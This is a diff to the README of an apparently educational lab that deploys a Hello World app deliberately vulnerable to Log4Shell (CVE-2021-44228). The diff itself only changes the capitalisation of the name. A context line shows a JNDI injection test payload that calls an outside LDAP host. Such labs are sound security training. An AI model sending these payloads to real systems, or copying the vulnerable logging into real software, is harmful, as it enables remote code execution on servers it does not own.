@@ -1,4 +1,4 @@
-log4shell-lab: Test log4shell mitigation via Deployment Overlays
+log4shell-lab: Test Log4Shell mitigation via Deployment Overlays
 =================================================
 Author: Trevor Terris  
 Level: Intermediate  
@@ -16,13 +16,13 @@ educational purposes only!
 What is it?
 -----------
 
-This example application is vulnerable to the "log4shell" vulnerability, CVE-2021-44228.
+This example application is vulnerable to the "Log4Shell" vulnerability, CVE-2021-44228.
 
 The example follows the common "Hello World" pattern. These are the steps that occur:
 
 1. A JSF page asks the user for their name.
 1. On clicking submit, the name is sent to a managed bean named `Greeter`.
-1. The name is printed to log output via log4j, using a library version vulnerable to log4shell.
+1. The name is printed to log output via log4j, using a library version vulnerable to Log4Shell.
 
 System requirements
 -------------------
@@ -62,7 +62,7 @@ Access the application
 The application will be running at the following URL <http://localhost:8080/log4shell-lab>.
 
 
-Investigate the log4shell vulnerability
+Investigate the Log4Shell vulnerability
 ----------------------------
 
 1. In the JSF page, enter the test payload described [here](https://log4shell.huntress.com/). For example: `${jndi:ldap://log4shell.huntress.com:1389/dccb9fc9-0d2f-45e1-be4d-abb7dc875d8f}`
